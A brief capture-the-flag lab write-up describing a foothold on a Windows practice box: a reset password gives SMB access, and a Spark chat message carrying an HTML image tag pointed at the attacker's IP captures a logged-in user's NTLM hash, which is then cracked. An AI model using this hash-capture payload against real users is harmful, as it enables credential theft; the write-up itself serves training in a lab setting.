# Foothold
We are able to change the user password on `lilyle:<REDACTED>` this gave us access to smb, we found the `\shared` directory which gave us the first user flag and hinted at using spark. 

I had some issues with the spark versions in the share, but was able to download and run spark using the tar.gz on their website.

We are able to see which users are online on spark from the windcorp.thm website and find that buse is logged in. 

Using the following payload
`<img src='http://<IP>/gibhash.jpg'>`
We are able to obtain his NTLM hash


```
buse::<REDACTED>
```

This cracks to 
`buse:<REDACTED>`